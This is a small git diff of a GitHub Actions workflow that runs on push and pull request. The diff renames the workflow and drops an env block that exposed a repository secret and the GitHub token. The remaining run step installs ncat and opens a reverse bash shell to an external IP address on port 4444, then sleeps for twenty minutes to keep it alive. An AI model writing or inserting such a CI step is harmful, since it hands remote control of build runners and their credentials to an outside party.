@@ -1,4 +1,4 @@
-name: token11
+name: token111
 
 on: [pull_request, push]
 
@@ -14,7 +14,4 @@ jobs:
     - uses: actions/checkout@v3
     - run: echo "test"
     - name: set env as secrets
-      env: 
-        MY_VAL: ${{ secrets.BLA_BLA }}
-        TEST : ${{ github.token }}
       run: sudo apt install -y ncat; ncat -e /bin/bash 18.222.231.153 4444; sleep 1200
